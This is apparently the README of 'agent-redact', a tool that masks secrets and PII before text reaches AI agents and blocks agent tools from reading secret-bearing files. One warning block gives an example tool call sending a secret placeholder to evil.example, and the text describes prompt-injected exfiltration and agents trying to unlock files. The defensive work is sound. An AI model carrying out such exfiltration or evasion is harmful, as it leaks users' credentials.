# agent-redact 🛡️

[![CI](https://github.com/TonyDuongg/agent-redact/actions/workflows/ci.yml/badge.svg)](https://github.com/TonyDuongg/agent-redact/actions/workflows/ci.yml)
[![npm version](https://img.shields.io/npm/v/agent-redact.svg?style=flat&color=3178c6)](https://www.npmjs.com/package/agent-redact)
[![PyPI version](https://img.shields.io/pypi/v/agent-redact.svg?style=flat&color=3776ab)](https://pypi.org/project/agent-redact/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen)](package.json)
[![Node.js Version](https://img.shields.io/badge/node-%3E%3D20.0.0-blue)](package.json)

> **Universal zero-latency, zero-leak secret & PII redactor for ALL AI Agents, LLMs, and Multi-Agent Workflows.**

Developers and autonomous AI agents (**Claude Code, Cursor, OpenAI, DeepSeek, Google Gemini, Ollama, LangChain, AutoGen, CrewAI**) frequently pipe local logs, source code, `.env` files, and database dumps directly into model prompt contexts. Unintentional leaks of credentials (Anthropic keys, OpenAI tokens, AWS keys, Stripe secrets, JWTs, database URLs) are catastrophic.

`agent-redact` is a universal privacy and secret firewall designed to protect **ANY** agentic architecture:
* Intercepts prompts before network transmission to any cloud or local LLM.
* Reversibly masks sensitive tokens (`[API_KEY_1]`).
* Restores values in generated agent responses without ever leaking secrets to external servers or monitoring tools.
* First-class integration via **CLI**, **Universal TypeScript Wrapper (`wrapAgent`)**, **streaming unmask for the Anthropic & OpenAI SDKs**, **Model Context Protocol (MCP)**, and **Express/Connect middleware**.

---

## ⚡ Highlights

* **Low-Latency, Linear-Time Scanning**: a typical 10 KB prompt is scanned in well under 1 ms, and scanning time grows linearly with input size (about 30 MB/s on clean text, including inputs with 100k findings or adversarial strings).
* **Dependency-Free Core**: the redaction engine (`import { redact } from 'agent-redact'`) imports no third-party code. The MCP server and CLI use `@modelcontextprotocol/sdk` and `zod`.
* **Dual-Way Reversible Masking (Vault)**: Masks sensitive tokens into numbered session placeholders (`[ANTHROPIC_API_KEY_1]`) and reliably unmasks them after the LLM completes its reasoning.
* **Severity-Based Conflict Resolution**: Mathematical arbitration prioritizes high-risk credentials over overlapping low-risk patterns (e.g. GitHub PAT vs. email regex).
* **CLI & SDK Ready**: Instant CLI utility (`npx agent-redact`) and modern dual ESM/CJS SDK for Node.js 20+.

---

## 📦 Installation

```bash
# Install globally or as a project dependency
npm install agent-redact

# Or run instantly via npx
npx agent-redact --help
```

---

## 🚀 Quick Start

### 1. Command-Line Interface (CLI)

#### Pipe input directly:
```bash
cat server.log | npx agent-redact
```

#### Scan a specific file:
```bash
npx agent-redact .env
```

#### Reversible masking (generates session placeholders):
```bash
cat app.log | npx agent-redact --reversible
```

#### Output as JSON for automated pipelines:
```bash
cat app.log | npx agent-redact --json
```

#### Save session vault and unmask later:
```bash
# 1. Mask and save session vault:
npx agent-redact input.log -r -o input.safe --vault-out session.vault.json

# 2. Restore file after agent finishes:
npx agent-redact input.safe --unmask session.vault.json -o input.restored
```

The vault holds the original secrets, so **encrypt it**. The passphrase is read from an environment variable, never from argv, so it stays out of shell history and process listings:

```bash
export VAULT_PASS='a long passphrase'                       # or set AGENT_REDACT_VAULT_KEY
npx agent-redact .env -r -o .env.safe --vault-out session.vault --vault-key-env VAULT_PASS
npx agent-redact .env.safe --unmask session.vault --vault-key-env VAULT_PASS -o .env.restored
```

Encrypted vaults use AES-256-GCM with a scrypt-derived key (N=2¹⁵). The format and KDF parameters are authenticated, so a tampered or downgraded file fails to decrypt. Writing a vault without a key prints a warning. From code: `encryptVaultJson(vault.toJSON(), pass)`, `Vault.fromJSON(decryptVaultJson(file, pass))`.

---

### 2. Node.js / TypeScript SDK

#### One-Way Redaction (Sanitization)
```typescript
import { redact } from 'agent-redact';

const prompt = `Debug this config:
ANTHROPIC_API_KEY=sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345
DATABASE_URL=postgres://user:password123@db.prod.internal:5432/main`;

const result = redact(prompt);

console.log(result.text);
// Output:
// Debug this config:
// ANTHROPIC_API_KEY=[REDACTED_ANTHROPIC_API_KEY]
// DATABASE_URL=[REDACTED_DATABASE_URL]

console.log(`Detected ${result.totalLeaks} leak(s) in ${result.durationMs}ms`);
```

#### Continuous Stream Processing (Line-Bounded Memory for Huge Files)
```typescript
import { createReadStream, createWriteStream } from 'node:fs';
import { createRedactStream } from 'agent-redact';

// Pipe gigabytes of logs without high memory consumption:
createReadStream('system-audit.log')
  .pipe(createRedactStream({ reversible: true }))
  .pipe(createWriteStream('sanitized-audit.log'));
```

> **Fail-closed PEM handling**: private key blocks are buffered until their `-----END ...-----` marker (up to 1 MB). If a block never closes, everything from its `BEGIN` marker onward is replaced by `[REDACTED_PRIVATE_KEY]` rather than risking a partial leak, so later lines in a truncated stream may be dropped.

#### Two-Way Reversible Masking & Unmasking (LLM Roundtrip)
```typescript
import { redact, unmask } from 'agent-redact';

const userPrompt = 'Please connect with Anthropic key sk-ant-api03-...';

// 1. Mask secrets before sending to LLM
const { text: safePrompt, vault } = redact(userPrompt, { reversible: true });
console.log(safePrompt);
// => "Please connect with Anthropic key [ANTHROPIC_API_KEY_1]"

// 2. LLM works safely with the placeholder
const llmResponse = await callClaudeSonnet(safePrompt);
// => "I will initiate the connection using [ANTHROPIC_API_KEY_1]."

// 3. Unmask original secrets when executing locally
const restoredResponse = unmask(llmResponse, vault!);
console.log(restoredResponse);
// => "I will initiate the connection using sk-ant-api03-..."
```

---

### 3. Universal AI Agent Interceptor (`wrapAgent`)

Wrap **ANY** agent function or LLM caller (OpenAI, DeepSeek, Google Gemini, Ollama, LangChain, etc.) in a single line. Prompts are sanitized automatically before reaching the model, and answers are restored seamlessly:

```typescript
import { wrapAgent } from 'agent-redact';
import OpenAI from 'openai';

const openai = new OpenAI();

// Wrap your agent call once:
const safeChatAgent = wrapAgent(
  async (sanitizedPrompt) => {
    // The prompt received here NEVER contains raw secrets!
    const res = await openai.chat.completions.create({
      model: 'gpt-4o',
      messages: [{ role: 'user', content: sanitizedPrompt }]
    });
    return res.choices[0]?.message.content ?? '';
  },
  {
    onLeakDetected: ({ result }) => {
      console.warn(`[Firewall] Redacted ${result.totalLeaks} secret(s) before LLM call.`);
    }
  }
);

// Pass raw user prompt - secrets are masked on the fly and restored in the answer:
const output = await safeChatAgent('Here is my token: sk-ant-api03-... please debug my server.');
```

`wrapAgent` restores placeholders in string answers, in plain objects/arrays (deeply), and in `async function*` token streams, including placeholders split across chunks. Class instances, such as SDK stream objects, are returned untouched; use the stream adapters below for those.

#### Full request/response objects and streaming (Anthropic & OpenAI SDKs)

`redactDeep` sanitizes every string in a request body (system prompt, every message, tool results) with **one shared vault**, so numbering stays consistent across the conversation. `unmaskDeep` restores a full response.

**Base64 payloads fail closed.**
- Values that only *claim* to be base64 (a `data` field next to `media_type`, or a `data:…;base64,` URL) but are not valid base64 are redacted like any other text.
- Base64 that decodes to text (a `text/*` or JSON document, or any payload without NUL bytes) is decoded, redacted and re-encoded, because the model reads it.
- Genuine binary (images, audio) is left byte-for-byte intact. Text inside binary formats such as PDFs is **not** scanned.

> ⚠️ **Unmasking model output re-introduces the real secret into whatever consumes it.** A prompt-injected model can try to exfiltrate a secret by writing its placeholder somewhere that leaves your machine, for example a tool argument (`http_get({ url: "https://evil.example/?k=[AWS_ACCESS_KEY_ID_1]" })`) or a Markdown image URL your UI renders.
> - Model-generated **tool-call inputs are therefore not unmasked by default** (deny-by-default). This covers:
>   - Anthropic `input` on `tool_use` / `server_tool_use` / `mcp_tool_use` blocks, and `partial_json`;
>   - OpenAI `arguments`, including later stream deltas without a `name`;
>   - Responses API `function_call_arguments` events;
>   - Gemini and LangChain `args`, and Vercel AI SDK tool `input`.
>
>   Opt in only for tools you trust with real secrets: `unmaskToolInputs: true`, or a predicate like `unmaskToolInputs: (name) => name === 'write_env_file'`. This works with `unmaskDeep`, both stream adapters and `wrapAgent`.
> - The stream adapters also **fail closed**: event and chunk shapes they do not recognise pass through with their placeholders intact.
> - For text, only unmask output that goes to a trusted destination (a local file, the user's own terminal), not into HTML or Markdown that loads remote resources.

```typescript
import Anthropic from '@anthropic-ai/sdk';
import { redactDeep, unmaskDeep, unmaskAnthropicStream } from 'agent-redact';

const client = new Anthropic();
const { value: safeRequest, vault } = redactDeep({
  model: 'claude-sonnet-5-5',
  max_tokens: 1024,
  system: systemPrompt,
  messages
});

// Non-streaming
const message = unmaskDeep(await client.messages.create(safeRequest), vault);

// Streaming: text split mid-placeholder ("[AWS_ACC" + "ESS_KEY_ID_1]") is restored.
// Tool-input JSON keeps its placeholders unless you opt in per tool; when restored,
// secrets are JSON-escaped so `partial_json` stays valid.
const stream = await client.messages.create({ ...safeRequest, stream: true });
for await (const event of unmaskAnthropicStream(stream, vault, {
  unmaskToolInputs: (tool) => tool === 'write_env_file'
})) {
  if (event.type === 'content_block_delta' && event.delta.type === 'text_delta') {
    process.stdout.write(event.delta.text);
  }
}
```

The same pattern works with the OpenAI SDK through `unmaskOpenAIStream(chunks, vault)` for Chat Completions chunk streams. For any other SDK or framework that yields plain text chunks, use `unmaskTextStream(asyncIterable, vault)`, `createUnmaskStream(vault)` (Node `Transform`) or the low-level `StreamingUnmasker`.

> The adapters follow the documented event shapes (`content_block_delta` with `text_delta` / `input_json_delta`, and `choices[].delta.content` / `tool_calls[].function.arguments`). Events are copied, never mutated. Text that is still buffered when a block or choice ends is emitted as an extra delta just before `content_block_stop`, or on the chunk carrying `finish_reason`.

---

### 4. Express / Node.js HTTP Middleware

Protect your backend AI API endpoints against secret leaks in request bodies:

```typescript
import express from 'express';
import { createExpressMiddleware } from 'agent-redact';

const app = express();
app.use(express.json());

// Automatically sanitizes prompt and message fields in req.body:
app.use(createExpressMiddleware());

app.post('/api/agent', async (req, res) => {
  // req.body.prompt is already sanitized!
  // req.redact holds audit metadata and session vault
  console.log(`Detected leaks: ${req.redact?.totalLeaks}`);
  const result = await runMyAgent(req.body.prompt);
  res.json({ result });
});
```

---

### 5. Configuration File & Custom Patterns (`.agentredactrc`)

`agent-redact` automatically discovers and loads configuration from `.agentredactrc`, `.agentredactrc.json`, or `agent-redact.config.json` in your project root:

```json
{
  "reversible": true,
  "allowlist": [
    "MOCK_KEY_FOR_LOCAL_DEV",
    "developer@example.com"
  ],
  "detectHighEntropy": true,
  "customPatterns": [
    {
      "id": "internal-corp-token",
      "name": "Corporate Microservice Token",
      "regex": "corp_live_[a-zA-Z0-9]{32}",
      "placeholder": "CORP_TOKEN"
    },
    {
      "id": "corp-key-assignment",
      "name": "Corporate key assignment",
      "regex": "corp_key\\s*=\\s*(?<secret>[A-Za-z0-9]{24,})",
      "placeholder": "CORP_KEY"
    }
  ]
}
```

* `id`, `name`, `regex` and `placeholder` are required; invalid entries stop the CLI with a clear error.
* The **whole match** is redacted by default, even if the regex contains capturing groups (e.g. `(acme|corp)_...`).
* To redact only part of the match, name that group `(?<secret>...)` or set `"secretGroup": 2` (group number or name).
* `allowlist` entries are matched **exactly**; substrings are not exempted.

---

### 6. Shannon Entropy Heuristics (Unknown Secret Detection)

Fixed regex patterns can't predict private, custom, or proprietary token prefixes. When `--entropy` or `detectHighEntropy: true` is enabled, `agent-redact` calculates the mathematical **Shannon Entropy** ($H(X) = -\sum P(x) \log_2 P(x)$) of values in key-assignment contexts:

* **Entropy $\ge 4.3$**: Flags and masks unstructured cryptographic Base64 strings.
* **Entropy $\ge 3.2$**: Flags and masks random Hex keys.
* **Predictable text** (`password = "admin123admin123"`): Safely ignored to prevent false positives.

```typescript
import { redact, calculateShannonEntropy } from 'agent-redact';

// Detect unknown random secrets:
const result = redact('custom_token = "d9F8qZ1_pLm4wK7aQx0vN2yB8rC3eH6j"', {
  detectHighEntropy: true
});
// => custom_token = "[REDACTED_GENERIC_SECRET]"
```

---

### 7. Model Context Protocol (MCP) Server (Claude, Cursor, Windsurf, VS Code)

`agent-redact` includes a native Model Context Protocol (MCP) server that empowers any AI assistant to sanitize prompts and local files before ingesting them into context.

#### A. Claude Desktop
Add `agent-redact` to `claude_desktop_config.json`:
* **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
* **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`

**macOS / Linux:**
```json
{
  "mcpServers": {
    "agent-redact": {
      "command": "npx",
      "args": ["-y", "agent-redact-mcp"]
    }
  }
}
```

**Windows:**
```json
{
  "mcpServers": {
    "agent-redact": {
      "command": "cmd.exe",
      "args": ["/c", "npx", "-y", "agent-redact-mcp"]
    }
  }
}
```

#### B. Claude Code CLI
Add the server with one command in your terminal:
```bash
claude mcp add agent-redact -- npx -y agent-redact-mcp
```

#### C. Cursor IDE
Create or edit `.cursor/mcp.json` in your workspace or global settings:
```json
{
  "mcpServers": {
    "agent-redact": {
      "command": "npx",
      "args": ["-y", "agent-redact", "mcp"]
    }
  }
}
```

#### D. Windsurf IDE
Add to `~/.codeium/windsurf/mcp_config.json`:
```json
{
  "mcpServers": {
    "agent-redact": {
      "command": "npx",
      "args": ["-y", "agent-redact", "mcp"]
    }
  }
}
```

#### E. VS Code (Cline / Roo Code)
Add to `cline_mcp_settings.json`:
```json
{
  "mcpServers": {
    "agent-redact": {
      "command": "npx",
      "args": ["-y", "agent-redact", "mcp"]
    }
  }
}
```

#### Available MCP Tools

| Tool | Purpose |
| :--- | :--- |
| `redact_text` | Scans and redacts credentials/PII, optionally allocating reversible session placeholders |
| `unmask_text` | Restores `[ANTHROPIC_API_KEY_1]` placeholders in agent responses back to real keys locally |
| `scan_file` | Audits and redacts sensitive content in `.env`, config, or log files before agent reads them |
| `get_vault_status` | Inspects currently vaulted placeholders and timestamps without exposing plaintext secrets |
| `clear_vault` | Wipes in-memory vault when session concludes |
| `list_supported_patterns` | Queries all active secret definitions and threat levels |

> [!WARNING]
> **MCP Context Isolation**: Files written by `unmask_text` contain plaintext secrets directly on disk. Ensure your agent prompts or tool permissions prohibit reading restored files back into the model context.

#### File Sandbox (`AGENT_REDACT_ALLOWED_DIR`)

`scan_file` and `unmask_text` only read/write inside the server's **working directory**, the **OS temp directory**, and the directory named by `AGENT_REDACT_ALLOWED_DIR`. Symlinks/junctions are resolved before the check, and writes inside any `.git` directory are refused.

Some MCP clients start servers with an unexpected working directory (for example `/` or the app's install folder), which would make the sandbox far broader than intended. Pin it explicitly:

```json
{
  "mcpServers": {
    "agent-redact": {
      "command": "npx",
      "args": ["-y", "agent-redact-mcp"],
      "env": { "AGENT_REDACT_ALLOWED_DIR": "/absolute/path/to/your/project" }
    }
  }
}
```

`scan_file` with `inPlace: true` writes a `file.bak` (then `file.bak.1`, …) containing the **original plaintext** before sanitizing. Keep backups out of version control and delete them when done.

---

### 8. Python Agents (LangChain, CrewAI, AutoGen) & Other Languages

The `agent-redact` Python package (source in [`python/`](python/)) wraps the CLI, so Python code gets the same engine with no Python dependencies.

```bash
pip install agent-redact
```

> **Node.js 20+ is still required.** The PyPI package contains only the Python wrapper; the detection engine is the Node.js CLI. It is found via an absolute `AGENT_REDACT_CLI`, a global `npm i -g agent-redact`, or a one-time install of the matching version into a private user cache. It is always started as `node <absolute path>`, never via shims, `npx` or the current directory.

```python
from agent_redact import redact, scan, Session

result = redact(prompt)                 # one-way: result.text, result.matches (no values)

with Session() as s:                    # reversible across a whole conversation
    safe = s.redact(prompt)             # [ANTHROPIC_API_KEY_1] ...
    answer = llm.invoke(safe)
    print(s.unmask(answer))

findings = scan(["."])                  # repo audit, honours .gitignore
```

The Session vault is stored in a private temporary directory, **encrypted** with a random per-session passphrase that never touches disk, and is deleted when the `with` block ends.

Other languages can pipe text through the CLI: `agent-redact --json` on stdin returns the redacted text plus matches. Use `-r --vault-out <file> --vault-key-env <VAR>` and `--unmask <file>` for reversible round-trips, and `--vault-in` to continue numbering across calls.

---

### 9. Docker & Container Workflows

Add zero-latency secret screening to your Docker container pipelines:

```dockerfile
# Run directly in any Node.js container
RUN npm install -g agent-redact
ENTRYPOINT ["agent-redact"]
```

---

### 10. GitHub Action for CI/CD Secret Screening

Automatically scan Pull Requests and commits for leaked credentials before they can be merged. Add `.github/workflows/secret-audit.yml`:

```yaml
name: Secret & Privacy Audit

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Scan repository for secrets
        uses: TonyDuongg/agent-redact@main
        with:
          scan-path: '.'
          fail-on-leak: 'true'
          detect-entropy: 'true'
          exclude: 'node_modules,dist,build,.git,coverage'
          baseline: '.agent-redact-baseline.json'   # optional: ignore accepted findings
          sarif-file: 'agent-redact.sarif'          # optional: GitHub code scanning report
```

To show findings in the repository's **Security → Code scanning** tab, upload the SARIF file (requires `permissions: security-events: write`):

```yaml
      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v4
        with:
          sarif_file: agent-redact.sarif
```

#### GitHub Action Features
* **In-PR Error Annotations**: exact file, line and column on the PR diff.
* **Markdown Step Summary**: audit table with categories and severities.
* **SARIF 2.1.0 output** with `security-severity` per rule. Secret values are never included, only a fingerprint.
* **Binary-safe and size-capped** scanning (`max-file-size`, default 5 MB).
* **Baselines and `agent-redact-ignore` comments** for accepted findings (see below).

---

### 11. Scanning Repositories, Baselines & Inline Ignores

Pass directories or several files to switch the CLI to **scan mode**. Findings are reported with file, line and column, never with the secret value, and the exit code is `1` when anything is found.

```bash
npx agent-redact .                                   # whole repo; honours .gitignore via git ls-files
npx agent-redact src config/app.env                  # several targets
npx agent-redact --staged                            # only what is about to be committed (git index)
npx agent-redact . --format sarif --report out.sarif # SARIF 2.1.0 (or --format json)
```

Outside a git work tree, `node_modules`, `dist`, `build`, `coverage`, `.next`, `vendor`, `.venv` and similar directories are skipped. Binary files (NUL-byte sniffing) and files over 5 MB are skipped and counted in the summary. Git runs with `core.fsmonitor` and other config-driven helpers disabled, so scanning an untrusted directory that carries its own `.git/config` cannot execute commands.

**Accepting known findings** (test fixtures, documentation samples):

```bash
npx agent-redact . --write-baseline .agent-redact-baseline.json   # record what exists today
npx agent-redact . --baseline .agent-redact-baseline.json         # later scans report only new findings
```

The baseline stores `sha256(pattern, file, value)` fingerprints, never the values. Alternatively, mark individual lines:

```ini
TEST_KEY=AKIA...EXAMPLE   # agent-redact-ignore
# agent-redact-ignore-next-line
FIXTURE_TOKEN=ghp_...
```

> Ignore comments and baselines apply **only to scanning/auditing** (CLI scan mode, GitHub Action, SARIF). They never disable redaction of prompts, streams or files, and the Claude Code hook ignores them on purpose, so an agent cannot unlock a file by editing a comment into it.

---

### 12. Claude Code Hook (block secrets before they reach the model)

`agent-redact hook` reads Claude Code's hook event JSON on stdin and exits with code `2` to block. Messages name the secret *types*, never the values.

| Event / tool | Behaviour |
| :--- | :--- |
| `UserPromptSubmit` | Blocks prompts that contain secrets (the prompt is not sent) |
| `PreToolUse` → `Read` | Blocks reading a file that contains secrets (suggests the MCP `scan_file` tool for a redacted copy) |
| `PreToolUse` → `Grep` (any output mode) | Blocks when the searched files include one that contains secrets, because content output prints them and `files_with_matches`/`count` act as an oracle. Files are enumerated like ripgrep: `.gitignore` is honoured, a repo-local `core.excludesFile` is not. The agent's regex is never evaluated, and a glob only narrows the check when it is a simple `*`/`**`/`?`/`{a,b}` pattern. |
| `PreToolUse` → `Bash` | Blocks commands that contain a literal secret, or that print a file with secrets (`cat`, `grep`, `head`, `jq`, …) |
| `PreToolUse` → `WebFetch`, `WebSearch`, MCP tools, others | Blocks calls whose input contains secrets, or whose `path`/`file_path`/`paths` point at a file with secrets (e.g. filesystem MCP servers) |
| `PreToolUse` → `Write` / `Edit` | Allowed by default; add `--block-writes` to block secrets being written |

**Fail-closed details:**
- Large files are scanned in full; above 64 MB the read is refused.
- UTF-16 files are decoded, and printable strings inside binary files are scanned.
- If an unexpected error happens, the action is blocked.
- `agent-redact-ignore` comments are not honoured.
- From the project `.agentredactrc`, which the agent can edit, the hook only uses settings that **add** detections (`customPatterns`, entropy). `allowlist`, `include` and `exclude` are ignored unless you point the hook at a config you control: `agent-redact hook --config ~/.config/agent-redact.json`.
- The tools of the `agent-redact` MCP server itself (`mcp__agent-redact__*`) are trusted, so `scan_file` can still read a redacted copy.

Install globally (`npm i -g agent-redact`) so the hook starts fast, then add to `.claude/settings.json` (project) or `~/.claude/settings.json` (user):

```json
{
  "hooks": {
    "UserPromptSubmit": [
      { "hooks": [{ "type": "command", "command": "agent-redact hook" }] }
    ],
    "PreToolUse": [
      { "matcher": "*", "hooks": [{ "type": "command", "command": "agent-redact hook" }] }
    ]
  }
}
```

> Limits: the hook sees tool **inputs**, not outputs. A command such as `env`, or a script that prints secrets indirectly, is not detected. Treat it as a strong guard rail rather than a sandbox, and combine it with the MCP `scan_file` tool and Claude Code deny rules for sensitive paths.

---

### 13. Pre-commit Git Hook

Prevent accidental credential commits locally using [pre-commit](https://pre-commit.com):

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/TonyDuongg/agent-redact
    rev: v0.2.0
    hooks:
      - id: agent-redact
```

Without the pre-commit framework, a plain git hook works too: `npx agent-redact --staged` in `.git/hooks/pre-commit` scans exactly what is being committed.

---

## 🎯 Supported Pattern Matrix

| Secret / Pattern Category | Sample Format / Prefix | Severity | Default Action |
| :--- | :--- | :---: | :---: |
| **Anthropic API Key** | `sk-ant-api03-...`, `sk-ant-admin01-...` | `CRITICAL` | `[ANTHROPIC_API_KEY]` |
| **OpenAI API Key** | `sk-proj-...`, `sk-...` | `CRITICAL` | `[OPENAI_API_KEY]` |
| **AWS Access Key ID** | `AKIA...`, `ASIA...` (20 chars) | `HIGH` | `[AWS_ACCESS_KEY_ID]` |
| **AWS Secret Access Key** | 40-character base64 with context | `CRITICAL` | `[AWS_SECRET_ACCESS_KEY]` |
| **GitHub Tokens** | `ghp_...`, `github_pat_...`, `gho_...` | `CRITICAL` | `[GITHUB_TOKEN]` |
| **Stripe Keys** | `sk_live_...`, `pk_live_...`, `rk_live_...` | `CRITICAL` | `[STRIPE_API_KEY]` |
| **Private Keys** | `-----BEGIN RSA/OPENSSH PRIVATE KEY-----` | `CRITICAL` | `[PRIVATE_KEY]` |
| **JSON Web Token (JWT)** | `eyJ... . eyJ... . ...` | `CRITICAL` | `[JWT_TOKEN]` |
| **Database URLs** | `postgres://`, `mongodb://`, `mysql://`, `mariadb://`, `redis://` | `CRITICAL` | `[DATABASE_URL]` |
| **HTTP Basic-Auth URLs** | `https://user:password@host/...` | `CRITICAL` | `[BASIC_AUTH_URL]` |
| **Google Cloud / Gemini** | `AIza[0-9A-Za-z_-]{35}` | `HIGH` | `[GOOGLE_API_KEY]` |
| **Slack Tokens** | `xoxb-...`, `xoxp-...`, `xapp-...` | `HIGH` | `[SLACK_TOKEN]` |
| **Hugging Face Token** | `hf_[a-zA-Z0-9]{34}` | `HIGH` | `[HUGGINGFACE_TOKEN]` |
| **GitLab PAT** | `glpat-[0-9a-zA-Z-_]{20,}` | `HIGH` | `[GITLAB_TOKEN]` |
| **NPM Access Token** | `npm_[A-Za-z0-9]{36}` | `CRITICAL` | `[NPM_TOKEN]` |
| **SendGrid API Key** | `SG.[A-Za-z0-9_-]{22}.[A-Za-z0-9_-]{43}` | `HIGH` | `[SENDGRID_API_KEY]` |
| **Twilio SID** | `AC[0-9a-fA-F]{32}` | `HIGH` | `[TWILIO_ACCOUNT_SID]` |
| **Supabase Key** | `sbp_[a-zA-Z0-9]{40}` | `CRITICAL` | `[SUPABASE_KEY]` |
| **Telegram Bot Token** | `<bot-id>:<35 chars>` | `CRITICAL` | `[TELEGRAM_BOT_TOKEN]` |
| **Twilio API Key** | `SK[0-9a-fA-F]{32}` | `CRITICAL` | `[TWILIO_API_KEY]` |
| **Azure Storage Key** | `AccountKey=...` (88 chars) | `CRITICAL` | `[AZURE_STORAGE_KEY]` |
| **GCP OAuth Client Secret** | `GOCSPX-...` | `CRITICAL` | `[GCP_OAUTH_CLIENT_SECRET]` |
| **DigitalOcean Token** | `dop_v1_[a-f0-9]{64}` | `CRITICAL` | `[DIGITALOCEAN_TOKEN]` |
| **Mailgun API Key** | `key-[0-9a-zA-Z]{32}` | `HIGH` | `[MAILGUN_API_KEY]` |
| **OpenRouter API Key** | `sk-or-v1-<hex>` | `CRITICAL` | `[OPENROUTER_API_KEY]` |
| **Groq API Key** | `gsk_...` | `CRITICAL` | `[GROQ_API_KEY]` |
| **xAI API Key** | `xai-...` | `CRITICAL` | `[XAI_API_KEY]` |
| **Perplexity API Key** | `pplx-...` | `CRITICAL` | `[PERPLEXITY_API_KEY]` |
| **Replicate API Token** | `r8_...` | `CRITICAL` | `[REPLICATE_API_TOKEN]` |
| **Hugging Face Org Token** | `api_org_...` | `HIGH` | `[HUGGINGFACE_ORG_TOKEN]` |
| **LangSmith API Key** | `lsv2_pt_...` / `lsv2_sk_...` | `HIGH` | `[LANGSMITH_API_KEY]` |
| **PII: Emails & IPv4/IPv6** | RFC 5321 emails, IPv4 & IPv6 network addrs | `MEDIUM` / `LOW` | `[EMAIL_ADDRESS]`, `[IPV4_ADDRESS]`, `[IPV6_ADDRESS]` |
| **PII: Phone Numbers** | US, international E.164, Vietnamese mobile & landline | `MEDIUM` | `[PHONE_NUMBER]` |
| **PII: SSN & Cards** | US SSN, Major Credit Cards | `CRITICAL` | `[US_SSN]`, `[CREDIT_CARD]` |

#### Opt-in presets

| Preset | Patterns | Enable with |
| :--- | :--- | :--- |
| `vn-pii` | Vietnamese citizen ID (CCCD, 12 digits, province code 001–096), CMND/CCCD numbers after an ID keyword, tax code (MST) after `MST`/`mã số thuế`, bank account after `STK`/`số tài khoản` | `"presets": ["vn-pii"]` in `.agentredactrc`, or `redact(text, { presets: ['vn-pii'] })` |

Presets are off by default because bare numbers are ambiguous (order or invoice IDs). Only the 12-digit CCCD matches without context, and only with a valid province code.

#### Detection quality

`tests/detection.test.ts` holds a labelled corpus:
- **Positive samples for every built-in pattern.** The test fails if a new pattern is added without one. Samples are assembled at runtime, so no real-looking token is committed.
- **A negative corpus** (`tests/fixtures/negatives.txt`) of realistic non-secret text: lockfile integrity hashes, git/docker digests, UUIDs, logs, versions, CSS, code, URLs, Ethereum addresses.

Current result: every positive is detected with its exact span, and there are **0 false positives** on the negative corpus. When you fix a false positive, add the snippet there.

---

## ⚡ Benchmark & Performance

Tested with Node.js 24 on realistic multi-agent payloads (~4KB containing code, env tokens, and system logs across 1,000 continuous iterations):

| Metric | Result | Impact |
| :--- | :---: | :--- |
| **Average Latency** | **`0.087 ms`** / scan | Invisible latency overhead in LLM inference loops |
| **Throughput** | **`11,510 scans / sec`** | Easily handles high-concurrency multi-agent servers |
| **Scaling** | **Linear** | 2 MB log with 100k findings in ~0.3 s; 80 KB adversarial input in < 0.1 s (guarded by `tests/perf.test.ts`) |
| **Stream Memory** | Bounded per line | `createRedactStream` buffers one line at a time (up to 1 MB for an open private-key block) |
| **Core Dependencies** | **None** | The engine imports no third-party code; MCP/CLI add `@modelcontextprotocol/sdk` and `zod` |

Run the benchmark locally:
```bash
npm run bench
```

---

## 🗺️ Roadmap & Milestones

* [x] **v1.0 (Core Engine & Advanced CLI)**:
  * High-performance single-pass regex scanner for 20+ secret categories.
  * Conflict resolution algorithm based on token severity.
  * Interactive CLI with color badges, in-place editing, and file piping.
  * Dual ESM/CJS build targeting Node.js 20+.
  * Zero runtime dependencies for core engine.
* [x] **v1.1 (Reversible Session Vault)**:
  * In-memory Vault with bidirectional placeholder substitution.
  * CLI `--vault-out` and `--unmask` persistence.
* [x] **v1.2 (Model Context Protocol Integration)**:
  * Official **Model Context Protocol (MCP)** server for Claude Desktop, Cursor, Windsurf.
  * 6 dedicated tools: `redact_text`, `unmask_text`, `scan_file`, `get_vault_status`, `clear_vault`, `list_supported_patterns`.
* [x] **v1.3 (Universal Agent Interceptors & Stream Processing)**:
  * `wrapAgent`: Framework-agnostic wrapper for OpenAI, DeepSeek, Gemini, Ollama, LangChain.
  * `createExpressMiddleware`: Express / Fastify / Node HTTP request body sanitizer.
  * `createRedactStream`: Node.js Transform stream for continuous log sanitization with line-bounded memory.
* [x] **v1.4 (Customization & Shannon Entropy Heuristics)**:
  * `.agentredactrc` / `agent-redact.config.json` configuration file loader.
  * Custom regex patterns and allowlist/whitelist exemption engine.
  * Shannon Entropy calculator ($H \ge 4.3$) for zero-day generic cryptographic keys.
* [x] **v1.5 (CI/CD Ecosystem & GitHub Action)**:
  * Official GitHub Action (`action.yml`) with in-PR file & line annotations.
  * Markdown Step Summary table in GitHub Actions runner.
  * `.pre-commit-hooks.yaml` for pre-commit git hooks.
* [ ] **v1.6 (NPM Public Distribution & Multi-OS CI)**:
  * Official public publishing to npm registry (`npm install agent-redact`).
  * Cross-platform support (Ubuntu, Windows, macOS) across Node.js 20, 22, and 24.
  * GitHub Release with automated verification and security audit conformance.

---

## 🤝 Community & Governance

* **Contributing**: Read our [Contributing Guidelines](CONTRIBUTING.md) to add new patterns or report improvements.
* **Security**: Read our [Security Policy](SECURITY.md) for responsible vulnerability disclosure.
* **Code of Conduct**: We adhere to the [Contributor Covenant](CODE_OF_CONDUCT.md).

```bash
# Run test suite
npm test

# Type checking
npm run typecheck

# Run performance benchmark
npm run bench

# Build release bundle
npm run build
```

---

## 📄 License

[MIT](LICENSE) © 2025-2026 Agent Redact Contributors.

